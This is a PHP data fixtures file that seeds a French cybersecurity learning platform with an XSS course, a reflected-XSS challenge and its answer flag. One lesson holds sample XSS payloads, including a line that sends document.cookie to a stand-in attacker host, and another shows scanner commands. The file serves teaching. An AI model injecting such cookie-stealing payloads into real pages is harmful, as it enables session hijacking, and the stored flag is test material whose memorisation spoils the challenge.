<?php

namespace App\DataFixtures;

use App\Entity\Categorie;
use App\Entity\Certification;
use App\Entity\Challenge;
use App\Entity\Course;
use App\Entity\Module;
use App\Entity\Task;
use Doctrine\Bundle\FixturesBundle\Fixture;
use Doctrine\Persistence\ObjectManager;


class AppFixtures extends Fixture
{
    public function load(ObjectManager $manager): void
    {
        $categoriesData = [
            [
                "name" => "Web"
            ],
            [
                "name" => "Network"
            ],
            [
                "name" => "Crypto"
            ]
        ];

        $categories = [];
        foreach ($categoriesData as $categorieData) {
            $categorie = new Categorie();
            $categorie->setName($categorieData["name"]);
            $manager->persist($categorie);
            $categories[] = $categorie;
        }


        $coursesData = [
            ["name" => "XSS - Cross Site Scripting", "point" => 25],
            ["name" => "SQL Injection", "point" => 25],
        ];

        $courses = [];
        foreach ($coursesData as $courseData) {
            $course = new Course();
            $course->setName($courseData["name"]);
            $course->setPoint($courseData['point']);
            $manager->persist($course);
            $courses[] = $course;
        }

        $tasksData = [
            [
                "name" => "Introduction",
                "content" => "## Qu'est-ce que le XSS ?\n\nLe Cross-Site Scripting (XSS) est l'une des vulnérabilités web les plus répandues et les plus dangereuses. Elle figure régulièrement dans le **Top 10 de l'OWASP**.\n\n## Les 3 types de XSS\n\n- **Reflected XSS** : le payload est inclus dans la requête\n- **Stored XSS** : le payload est stocké en base de données\n- **DOM-based XSS** : le payload manipule le DOM\n\n## Questions\n\n**Q1 : Quel organisme publie le Top 10 des vulnérabilités web ?**\n\n**Q2 : Quel type de XSS persiste en base de données ?**",
                "taskOrder" => 1,
                "courseIndex" => 0
            ],
            [
                "name" => "XSS Payloads",
                "content" => "## Qu'est-ce qu'un payload XSS ?\n\nUn payload XSS est le code JavaScript qu'un attaquant injecte dans une application vulnérable.\n\n## Payloads de base\n\n```javascript\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n```\n\n## Vol de cookies\n\n```javascript\n<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>\n```\n\n## Questions\n\n**Q1 : Quelle propriété contient le token de session ?**\n\n**Q2 : Quelle méthode est utilisée comme Proof of Concept ?**",
                "taskOrder" => 2,
                "courseIndex" => 0
            ],
            [
                "name" => "Se protéger",
                "content" => "## L'échappement des données\n\n```php\nhtmlspecialchars(\$data);\n```\n\n## Content Security Policy\n\n```\nContent-Security-Policy: script-src 'self'\n```\n\n## Cookies HttpOnly\n\n```\nSet-Cookie: session=abc123; HttpOnly; Secure\n```\n\n## Questions\n\n**Q1 : Quelle fonction PHP échappe les caractères spéciaux ?**\n\n**Q2 : Quel flag empêche JavaScript d'accéder aux cookies ?**",
                "taskOrder" => 3,
                "courseIndex" => 0
            ],
            [
                "name" => "Outils",
                "content" => "## Burp Suite\n\nL'outil incontournable du pentester web.\n\n## XSStrike\n\n```bash\ngit clone https://github.com/s0md3v/XSStrike\npython3 xsstrike.py -u 'http://target.com/search?q=test'\n```\n\n## Dalfox\n\n```bash\ndalfox url 'http://target.com/search?q=test'\n```\n\n## Questions\n\n**Q1 : Quel outil est spécialisé dans la détection de XSS ?**\n\n**Q2 : Dans quel langage est écrit Dalfox ?**",
                "taskOrder" => 4,
                "courseIndex" => 0
            ],
            [
                "name" => "Conclusion",
                "content" => "## Récapitulatif\n\n- Les 3 types de XSS\n- Les payloads les plus courants\n- Comment se protéger\n- Les outils des pentesters\n\n## Passage au challenge\n\nExploite la faille XSS Reflected pour récupérer le flag caché dans les cookies.\n\n> **Indice** : utilise `document.cookie`\n\nBonne chance ! 🎯",
                "taskOrder" => 5,
                "courseIndex" => 0
            ],
        ];

        $tasks = [];
        foreach ($tasksData as $taskData) {
            $task = new Task();
            $task->setName($taskData["name"]);
            $task->setContent($taskData['content']);
            $task->setTaskOrder($taskData["taskOrder"]);
            $task->setCourse($courses[$taskData["courseIndex"]]);
            $manager->persist($task);
            $tasks[] = $task;
        };

        $challengesData = [
            [
                "name" => "XSS Challenge",
                "content" => "## Objectif\n\nUne application web affiche le contenu d'un paramètre URL directement dans la page sans le filtrer.\n\n## Contexte\n\nTu as accès à une page de recherche vulnérable. Le paramètre `q` est reflété directement dans le HTML sans échappement.\n\n## Mission\n\nExploite la faille XSS Reflected pour exécuter du JavaScript dans le navigateur et récupère le flag caché dans les cookies de la page.\n\n## Indice\n\nUtilise `document.cookie` pour accéder aux cookies.",
                "point" => 100,
                "flag" => "flag{xss_r3fl3ct3d_f0und}"
            ],
        ];

        $challenges = [];
        foreach ($challengesData as $challengeData) {
            $challenge = new Challenge();
            $challenge->setName($challengeData['name']);
            $challenge->setContent($challengeData["content"]);
            $challenge->setPoint($challengeData["point"]);
            $challenge->setFlag($challengeData["flag"]);
            $manager->persist($challenge);
            $challenges[] = $challenge;
        }


        $modulesData = [
            [
                "name" => "XSS - Introduction",
                "description" => "Apprends les bases des attaques XSS (Cross-Site Scripting) et comment les exploiter.",
                "difficulty" => "Facile",
                "courseIndex" => 0,
                "challengeIndex" => 0,
                "categorieIndex" => 0
            ]
        ];

        $modules = [];
        foreach ($modulesData as $moduleData) {
            $module = new Module();
            $module->setName($moduleData["name"]);
            $module->setDescription($moduleData["description"]);
            $module->setDifficulty($moduleData["difficulty"]);
            $module->setCourse($courses[$moduleData["courseIndex"]]);
            $module->setChallenge($challenges[$moduleData['challengeIndex']]);
            $module->setCategorie($categories[$moduleData["categorieIndex"]]);
            $manager->persist($module);
            $modules[] = $module;
        }

        $certificationsData = [
            [
                "name" => "Pentester",
                "image" => "/images/certifications/pentester.png",
                "moduleIndex" => null
            ],
            [
                "name" => "Defender",
                "image" => "/images/certifications/defender.png",
                "moduleIndex" => null
            ],
        ];

        $certifications = [];
        foreach ($certificationsData as $certificationData) {
            $certification = new Certification();
            $certification->setName($certificationData["name"]);
            $certification->setImage($certificationData["image"]);
            if ($certificationData["moduleIndex"] !== null) {
                $certification->setModule($modules[$certificationData["moduleIndex"]]);
            }
            $manager->persist($certification);
            $certifications[] = $certification;
        }

        $manager->flush();
    }
}
